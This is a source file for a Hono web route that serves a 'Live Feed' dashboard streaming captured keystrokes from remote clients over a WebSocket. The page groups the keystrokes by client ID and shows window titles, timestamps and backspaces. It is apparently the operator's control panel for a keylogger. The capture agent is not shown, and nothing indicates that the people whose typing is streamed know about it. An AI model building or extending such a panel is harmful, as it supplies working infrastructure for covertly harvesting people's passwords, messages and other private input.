import { Hono } from "hono";
import type { Env } from "../types";
import { Layout } from "./layout";

const live = new Hono<{ Bindings: Env }>();

live.get("/", (c) => {
  const wsProtocol = c.req.url.startsWith("https") ? "wss" : "ws";
  const host = c.req.header("host") ?? "localhost";
  const wsUrl = `${wsProtocol}://${host}/ws`;

  const liveScript = `
    const output = document.getElementById('live-output');
    const statusEl = document.getElementById('status-text');
    const dotEl = document.getElementById('status-dot');
    const toggleBtn = document.getElementById('toggle-btn');
    const clearBtn = document.getElementById('clear-btn');
    const filterInput = document.getElementById('filter-input');
    const countEl = document.getElementById('msg-count');
    const bytesEl = document.getElementById('byte-count');

    let ws = null;
    let count = 0;
    let bytes = 0;
    let autoScroll = true;

    // Track current line span per client so we can append inline
    const clientLines = {};

    function setStatus(state, text) {
      statusEl.textContent = text;
      const colors = {
        connected: 'bg-lime animate-pulse-dot',
        connecting: 'bg-yellow-400 animate-pulse',
        disconnected: 'bg-zinc-600',
        error: 'bg-red-400',
      };
      dotEl.className = 'w-2 h-2 rounded-full ' + (colors[state] || 'bg-zinc-600');
    }

    function addLine(text, cls) {
      const d = document.createElement('div');
      d.textContent = text;
      d.className = cls || '';
      output.appendChild(d);
      if (autoScroll) output.scrollTop = output.scrollHeight;
    }

    function newLine(clientId) {
      const row = document.createElement('div');
      row.className = 'flex gap-2 items-start';

      const label = document.createElement('span');
      label.className = 'text-accent/50 text-[11px] shrink-0 select-none pt-px';
      label.textContent = clientId;

      const span = document.createElement('span');
      span.className = 'text-zinc-300 break-all whitespace-pre-wrap';

      row.appendChild(label);
      row.appendChild(span);
      output.appendChild(row);

      // Limit DOM
      while (output.children.length > 5000) output.removeChild(output.firstChild);

      clientLines[clientId] = span;
      return span;
    }

    function addKeystroke(msg) {
      count++;
      bytes += new TextEncoder().encode(msg.data).length;
      countEl.textContent = count;
      bytesEl.textContent = fmtBytes(bytes);

      const text = msg.data;
      const cid = msg.clientId;

      // Get or create current line for this client
      let span = clientLines[cid];
      if (!span) span = newLine(cid);

      // Walk through the text - newlines and window markers start new lines
      let i = 0;
      while (i < text.length) {
        // Check for window context marker: \\n[...]
        const windowMatch = text.substring(i).match(/^\\n?\\[([^\\]]+)\\]:\\s?/);
        if (windowMatch) {
          // Start new line with window header
          const winRow = document.createElement('div');
          winRow.className = 'text-yellow-500/60 text-[11px] mt-2 mb-0.5 select-none';
          winRow.textContent = windowMatch[1];
          output.appendChild(winRow);
          span = newLine(cid);
          i += windowMatch[0].length;
          continue;
        }

        // Check for timestamp marker: [HH:MM]
        const timeMatch = text.substring(i).match(/^\\[([0-9]{2}:[0-9]{2})\\]\\s?/);
        if (timeMatch) {
          const ts = document.createElement('span');
          ts.className = 'text-zinc-600 text-[10px]';
          ts.textContent = timeMatch[1] + ' ';
          span.appendChild(ts);
          i += timeMatch[0].length;
          continue;
        }

        if (text[i] === '\\n') {
          span = newLine(cid);
          i++;
          continue;
        }

        if (text[i] === '\\t') {
          const tab = document.createElement('span');
          tab.className = 'text-zinc-600';
          tab.textContent = '  \u2192  ';
          span.appendChild(tab);
          i++;
          continue;
        }

        // Check for <BS> marker
        if (text.substring(i, i + 4) === '<BS>') {
          const bs = document.createElement('span');
          bs.className = 'text-red-400/50 text-[10px]';
          bs.textContent = '\u232b';
          span.appendChild(bs);
          i += 4;
          continue;
        }

        // Regular character - accumulate a run
        let run = '';
        while (i < text.length && text[i] !== '\\n' && text[i] !== '\\t' && text.substring(i, i+4) !== '<BS>' && !text.substring(i).match(/^\\n?\\[/)) {
          run += text[i];
          i++;
        }
        if (run) {
          const ch = document.createElement('span');
          ch.className = 'keystroke-flash';
          ch.textContent = run;
          span.appendChild(ch);
        }
      }

      if (autoScroll) output.scrollTop = output.scrollHeight;
    }

    function fmtBytes(b) {
      if (b === 0) return '0 B';
      const k = 1024, u = ['B','KB','MB','GB'];
      const i = Math.floor(Math.log(b) / Math.log(k));
      return parseFloat((b / Math.pow(k, i)).toFixed(1)) + ' ' + u[i];
    }

    function connect() {
      if (ws) { ws.close(); ws = null; }
      setStatus('connecting', 'Connecting...');
      ws = new WebSocket('${wsUrl}');

      ws.onopen = () => {
        setStatus('connected', 'Connected');
        toggleBtn.textContent = 'Disconnect';
        toggleBtn.className = toggleBtn.className.replace('bg-lime/10 text-lime border-lime/20 hover:bg-lime/20', 'bg-red-500/10 text-red-400 border-red-500/20 hover:bg-red-500/20');
        const session = filterInput.value.trim() || '*';
        ws.send(JSON.stringify({ type: 'subscribe', sessionId: session }));
      };

      ws.onmessage = (e) => {
        const msg = JSON.parse(e.data);
        if (msg.type === 'keystroke') addKeystroke(msg);
        else if (msg.type === 'connected') setStatus('connected', msg.message);
        else if (msg.type === 'error') addLine('Error: ' + msg.message, 'text-red-400 text-[12px]');
      };

      ws.onclose = (e) => {
        setStatus('disconnected', 'Disconnected');
        toggleBtn.textContent = 'Connect';
        toggleBtn.className = toggleBtn.className.replace('bg-red-500/10 text-red-400 border-red-500/20 hover:bg-red-500/20', 'bg-lime/10 text-lime border-lime/20 hover:bg-lime/20');
        ws = null;
        if (e.code !== 1000) setTimeout(connect, 3000);
      };

      ws.onerror = () => setStatus('error', 'Error');
    }

    toggleBtn.addEventListener('click', () => {
      if (ws) { ws.close(1000); } else { connect(); }
    });

    clearBtn.addEventListener('click', () => {
      output.innerHTML = '';
      Object.keys(clientLines).forEach(k => delete clientLines[k]);
      count = 0; bytes = 0;
      countEl.textContent = '0';
      bytesEl.textContent = '0 B';
    });

    filterInput.addEventListener('change', () => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: 'subscribe', sessionId: filterInput.value.trim() || '*' }));
      }
    });

    output.addEventListener('scroll', () => {
      autoScroll = output.scrollTop + output.clientHeight >= output.scrollHeight - 50;
    });

    connect();
  `;

  return c.html(
    <Layout title="Live Feed" activeTab="live" script={liveScript}>
      <div class="animate-fade-up">
        <div class="flex items-center justify-between mb-6">
          <div>
            <h1 class="text-2xl font-bold text-white tracking-tight">Live Feed</h1>
            <p class="text-sm text-zinc-500 mt-1">Real-time keystroke stream</p>
          </div>
          <div class="flex items-center gap-2.5">
            <span id="status-dot" class="w-2 h-2 rounded-full bg-zinc-600" />
            <span id="status-text" class="text-[12px] text-zinc-500 font-mono">Disconnected</span>
          </div>
        </div>

        <div class="flex items-center gap-3 mb-4">
          <div class="relative flex-1 max-w-xs">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="absolute left-3 top-1/2 -translate-y-1/2 text-zinc-600">
              <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
              <polyline points="22,6 12,13 2,6" />
            </svg>
            <input
              id="filter-input"
              type="text"
              placeholder="Filter session (* = all)"
              class="w-full pl-9 pr-3 py-2 text-[13px] font-mono rounded-lg bg-bg-card border border-bg-border text-zinc-300 placeholder-zinc-600 focus:outline-none focus:border-accent/40 transition-colors"
            />
          </div>
          <button
            id="toggle-btn"
            class="px-4 py-2 text-[13px] font-medium rounded-lg bg-lime/10 text-lime border border-lime/20 hover:bg-lime/20 transition-all"
          >
            Connect
          </button>
          <button
            id="clear-btn"
            class="px-4 py-2 text-[13px] font-medium rounded-lg bg-white/[0.04] text-zinc-400 border border-bg-border hover:bg-white/[0.07] transition-all"
          >
            Clear
          </button>
        </div>

        <div class="flex items-center gap-4 mb-3 text-[11px] font-mono text-zinc-600">
          <span><span id="msg-count" class="text-zinc-400">0</span> messages</span>
          <span><span id="byte-count" class="text-zinc-400">0 B</span> received</span>
        </div>

        <div class="gradient-border rounded-xl bg-bg-card border border-bg-border overflow-hidden animate-glow">
          <div
            id="live-output"
            class="p-4 text-[13px] font-mono leading-relaxed overflow-auto bg-[#0a0a0c] space-y-0.5"
            style="min-height: 450px; max-height: 75vh;"
          />
        </div>
      </div>
    </Layout>,
  );
});

export { live };
